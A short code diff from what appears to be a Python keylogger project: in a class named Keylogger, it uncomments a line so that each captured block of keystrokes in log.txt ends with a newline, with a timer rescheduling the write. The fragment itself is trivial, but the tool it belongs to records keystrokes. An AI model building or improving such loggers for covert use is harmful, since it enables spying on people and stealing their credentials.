@@ -38,7 +38,7 @@ class Keylogger:
         logC += self.log
         f = open("log.txt","a")
         f.write(logC)
-        # f.write("\n")
+        f.write("\n")
         self.log = ""
         timer = Timer(interval=self.interval, function=self.writeLog)
         # timer.daemon = True
